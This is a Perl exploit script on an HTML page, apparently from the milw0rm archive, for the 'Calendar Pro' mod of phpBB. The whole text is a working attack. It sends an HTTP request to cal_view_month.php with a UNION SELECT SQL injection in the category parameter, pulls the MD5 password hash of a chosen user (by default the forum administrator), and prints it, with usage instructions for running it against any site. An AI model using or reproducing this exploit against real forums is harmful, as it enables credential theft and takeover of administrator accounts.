<html><head><title>phpBB <= 2.0.13 'Calendar Pro' mod Remote Exploit</title></head><pre>#!/usr/bin/perl -w
use IO::Socket;

##    Example:
##    C:\&gt;cal_phpbb.pl www.site.com /phpBB2/ 2
##
##    'Calendar Pro' Mod for phpBB
##    *************************
##      [~] Connecting...
##      [+] Connected!
##      [~] Sending Data...
##      [~] Data Sent, Waiting for response...
##      [+] MD5 Hash for user with id=2 is: 81dc9bdb52d04dc20036dbd8313ed055
##
if (@ARGV &lt; 3)
{
print &quot;\n\n&quot;;
print &quot;|****************************************************************|\n&quot;;
print &quot; 'Calendar Pro' Mod &lt;= 2.0.33 (Newest version) For phpBB\n&quot;;
print &quot; Bug found by Axl\n&quot;;
print &quot; Coded by CereBrums // 4/4/2005\n&quot;;
print &quot; Usage: cal_phpbb.pl &lt;server&gt; &lt;folder&gt; &lt;user_id&gt;\n&quot;;
print &quot; e.g.: cal_phpbb.pl www.site.com /phpBB2/ 2 \n&quot;;
print &quot; [~] &lt;server&gt; - site address\n&quot;;
print &quot; [~] &lt;folder&gt; - forum folder\n&quot;;
print &quot; [~] &lt;user_id&gt; - user id (2 is default for phpBB admin) \n&quot;;
print &quot;|****************************************************************|\n&quot;;
print &quot;\n\n&quot;;
exit(1);
}

$take = 0;
$server = $ARGV[0];
$folder = $ARGV[1];
$user_id = $ARGV[2];
print &quot;\n 'Calendar Pro' Mod for phpBB\n&quot;;
print &quot; *****************************\n&quot;;
print &quot;  [~] Connecting...\n&quot;;
$socket = IO::Socket::INET-&gt;new(
Proto =&gt; &quot;tcp&quot;,
PeerAddr =&gt; &quot;$server&quot;,
PeerPort =&gt; &quot;80&quot;) || die &quot;$socket error $!&quot;;

print &quot;  [+] Connected!\n&quot;;
print &quot;  [~] Sending Data...\n&quot;;

$path = &quot;http://$server/&quot;;
$path .= &quot;/$folder/&quot;;
$path .= &quot;cal_view_month.php?month=04&amp;year=2005&amp;category=-1%20UNION%20SELECT%20user_password%20FROM%20phpbb_users%20where%20user_id=$user_id/*&quot;;
print $socket &quot;GET $path HTTP/1.0\r\n\r\n&quot;;

print &quot;  [~] Data Sent, Waiting for response...\n&quot;;

while ($answer = &lt;$socket&gt;)
{
       if ($take == 1) {
               $in = rindex ($answer, &quot;(&quot;);
               if ( $in &gt; -1 ) {
                       $pass = substr($answer,$in+1,32);
                       print &quot;  [+] MD5 Hash for user with id=$user_id is: $pass\n&quot;;
                       exit();
               }
       }
       if ( rindex ($answer,&quot;cal_view_month.php?month=3&amp;year=2005&quot;) &gt; -1 ) {
               $take = 1;
       }
}
print &quot;  [-] Exploit failed\n&quot;;

#### EOF ####

# milw0rm.com [2005-04-04]</pre></html>